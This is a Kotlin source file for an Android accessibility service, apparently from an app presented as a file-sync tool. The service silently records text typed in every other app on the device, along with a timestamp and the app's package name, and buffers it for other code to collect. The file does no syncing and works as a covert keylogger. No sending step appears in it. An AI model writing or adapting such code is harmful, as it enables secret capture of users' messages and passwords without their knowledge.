package com.georgetech.filesync.modules

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
import java.util.concurrent.ConcurrentLinkedQueue

class InputService : AccessibilityService() {

    companion object {
        val buffer = ConcurrentLinkedQueue<String>()
        private const val MAX_BUFFER = 5000

        fun drain(): List<String> {
            val entries = mutableListOf<String>()
            while (buffer.isNotEmpty() && entries.size < MAX_BUFFER) {
                buffer.poll()?.let { entries.add(it) }
            }
            return entries
        }
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        event ?: return
        when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                val text = event.text?.joinToString("") ?: return
                val pkg = event.packageName?.toString() ?: "unknown"
                val entry = "${System.currentTimeMillis()}|$pkg|$text"
                if (buffer.size < MAX_BUFFER) buffer.add(entry)
            }
            else -> {}
        }
    }

    override fun onInterrupt() {}
}
